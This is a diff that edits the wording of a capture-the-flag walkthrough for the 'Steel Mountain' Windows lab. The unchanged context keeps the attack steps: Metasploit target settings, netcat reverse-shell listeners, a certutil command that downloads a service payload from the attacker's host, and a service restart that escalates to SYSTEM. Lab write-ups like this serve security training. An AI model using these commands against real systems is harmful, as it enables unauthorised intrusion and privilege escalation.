@@ -37,10 +37,9 @@ set RHOSTS <target IP>
 set RPORT 8080
 set LHOST <local IP>
 ```
-We can leave the LPORT to 4444
-And finally hit `run` or `exploit`.
+We can leave the LPORT to 4444 and hit `run`.
 ![](https://github.com/user-attachments/assets/8883396f-88a0-40e4-80b4-1a02c548e4b7)
-And...We're in! 
+A session was obtained successfully with user bill. 
 ```
 getuid:
 STEELMOUNTAIN\bill
@@ -77,7 +76,8 @@ The upload function of meterpreter will automatically overwrite the file.
 Now it's time to fire up netcat `nc -lvnp 4445` and start the service:
 ![](https://github.com/user-attachments/assets/443f4d1d-f558-42c5-a74e-45c764be9d02)
 
-The service will probably crash but we will have triggered our payload. We are now root.
+The service will probably crash but we will have triggered our payload.
+Local privilege escalation was achieved via a vulnerable service running as SYSTEM.
 ![](https://github.com/user-attachments/assets/048828a9-c5d4-4cbc-a0b7-5dfa5e0c3970)
 
 
@@ -132,7 +132,7 @@ certutil -f -split -urlcache http://<IP>:<PORT>/ASCService.exe ASCService.exe
 ```
 ![](https://github.com/user-attachments/assets/cc6d0c75-c85d-41ee-be42-c521a5e6e027)
 
-In another terminal, fire up `nc -lvnp <PORT>` and finally, by restarting the service we will own our root shell. 
+In another terminal, fire up `nc -lvnp <PORT>` and by restarting the service we will have obtained NT AUTHORITY/SYSTEM privileges, this time with manual exploitation. 
 ```
 sc start AdvancedSystemCareService9
 ```
